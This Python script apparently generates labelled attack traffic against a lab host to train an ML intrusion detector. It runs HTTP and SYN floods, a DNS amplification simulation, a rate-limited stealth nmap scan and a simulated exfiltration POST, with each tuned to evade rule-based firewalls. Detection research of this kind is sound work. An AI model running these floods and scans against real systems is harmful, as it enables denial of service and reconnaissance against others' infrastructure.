# attack_scripts.py — attacks designed to evade rule-based firewall
import subprocess
import time
import random
import sys

TARGET = "10.0.1.2"
USER = "testuser"

# Fixed: small wordlist so brute force doesn't run for hours
# Create this file with: seq 1 500 | xargs -I{} echo "password{}" > /tmp/mini_wordlist.txt
WORDLIST = "/tmp/mini_wordlist.txt"

LABEL_FILE = "labels.log"

# ------------------ LABEL LOGGER ------------------
# Fixed: log_event was defined but never called in the original attack functions

def log_event(label):
    ts = time.time()
    print(f"[LABEL] {label} @ {ts:.2f}")

"""
def slow_http_attack():

    Slowloris-style attack — opens many connections and sends headers slowly.
    Bypasses firewall because: uses port 80 (allowed), sends valid ACKs (allowed),
    never completes HTTP request so server hangs.
    ML detects it via: very low fwd_byte_rate, high connection count, abnormal pkt_len_std.
    
    log_event("ATTACK_SLOWLORIS_START")
    print("\n[ATTACK] Slow HTTP (Slowloris-style)")
    # slowhttptest must be installed: apt install slowhttptest
    subprocess.run([
        "slowhttptest",
        "-c", "500",        # 500 concurrent connections
        "-H",               # slowloris mode (incomplete headers)
        "-i", "10",         # send header every 10 seconds
        "-r", "200",        # 200 connections per second
        "-t", "GET",
        "-u", f"http://{TARGET}/",
        "-x", "24",         # max length
        "-p", "3",          # probe timeout
        "-l", "60"          # run for 60 seconds
    ], timeout=90)
    log_event("ATTACK_SLOWLORIS_END")
"""

def http_flood_low_and_slow():
    """
    Low-rate HTTP flood — stays under rate limits but is abnormal.
    Bypasses firewall because: port 80 allowed, valid HTTP requests.
    ML detects it via: uniform pkt_len (all requests identical), 
    high fwd_packet_rate relative to bwd, no variation in timing.
    """
    log_event("ATTACK_LOW_HTTP_START")
    print("\n[ATTACK] Low-rate HTTP flood")
    end = time.time() + 60
    while time.time() < end:
        # Many parallel curl processes — sustained but spread out
        procs = []
        for _ in range(20):
            p = subprocess.Popen(
                ["curl", "-s", f"http://{TARGET}/", "-o", "/dev/null"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            procs.append(p)
        for p in procs:
            p.wait()
        time.sleep(0.1)  # brief pause — not zero, stays under basic rate limits
    log_event("ATTACK_LOW_HTTP_END")


def dns_amplification_sim():
    """
    Simulated DNS amplification pattern — large response, small request.
    Bypasses firewall because: port 53 (DNS) is allowed.
    ML detects it via: very high bwd_byte_rate vs fwd_byte_rate ratio,
    large pkt_len_max in responses.
    """
    log_event("ATTACK_DNS_AMP_START")
    print("\n[ATTACK] DNS amplification simulation")
    # dig with ANY query — generates large responses
    end = time.time() + 30
    while time.time() < end:
        subprocess.run(
            ["dig", "ANY", "google.com", f"@{TARGET}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=5
        )
        time.sleep(0.05)
    log_event("ATTACK_DNS_AMP_END")


def port_scan_stealth():
    """
    Slow stealth scan — bypasses simple rate-based rules.
    The firewall's default-deny blocks non-open ports regardless,
    but ML sees the pattern: many dest_ports, SYN-only, no ACK response.
    """
    log_event("ATTACK_STEALTH_SCAN_START")
    print("\n[ATTACK] Stealth port scan (slow)")
    subprocess.run([
        "sudo", "nmap",
        "-sS",              # SYN scan
        "-T2",              # Slow timing (evades rate limits)
        "--max-rate", "10", # 10 packets/sec — under most thresholds
        "-p", "1-1000",
        TARGET
    ], timeout=120)
    log_event("ATTACK_STEALTH_SCAN_END")


def data_exfil_sim():
    """
    Simulated data exfiltration — large outbound transfers.
    Bypasses firewall because: port 80/443 allowed, valid TCP.
    ML detects it via: very high fwd_byte_rate, large pkt_len_mean,
    low syn_ratio (established connection, lots of data).
    """
    log_event("ATTACK_EXFIL_START")
    print("\n[ATTACK] Data exfiltration simulation")
    # Generate random data and POST it repeatedly — mimics exfil
    subprocess.run(
        ["dd", "if=/dev/urandom", "of=/tmp/exfil_data", "bs=1M", "count=10"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    end = time.time() + 30
    while time.time() < end:
        subprocess.run([
            "curl", "-s", "-X", "POST",
            f"http://{TARGET}/upload",
            "--data-binary", "@/tmp/exfil_data",
            "-o", "/dev/null"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
    log_event("ATTACK_EXFIL_END")

def dos_syn():
    log_event("ATTACK_SYN_FLOOD_START")
    print("\n[ATTACK] SYN Flood (hping3)")
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "--flood",
        "-p", "80",
        TARGET
    ])
    time.sleep(10)
    process.terminate()
    process.wait()  # Fixed: wait for process to fully clean up
    log_event("ATTACK_SYN_FLOOD_END")


ATTACKS = [
    #slow_http_attack,
    http_flood_low_and_slow,
    dns_amplification_sim,
    port_scan_stealth,
    data_exfil_sim,
    dos_syn
]


# ------------------ MAIN ------------------

def main():
    print(f"[+] Starting attack simulation on {TARGET}")
    print("[+] Press Ctrl+C to stop\n")

    # Clear previous labels
    open(LABEL_FILE, "w").close()

    try:
        while True:
            attack = random.choice(ATTACKS)

            try:
                attack()
            except subprocess.TimeoutExpired:
                print("[!] Attack timed out, moving on")
            except Exception as e:
                print(f"[!] Attack error: {e}")

            # Fixed: longer cooldown so collector captures clean benign
            # windows between attacks — short cooldown blurs labels
            cooldown = random.randint(2, 5)
            print(f"\n[+] Cooling down for {cooldown}s...\n")
            time.sleep(cooldown)

    except KeyboardInterrupt:
        print("\n[-] Attack simulation stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()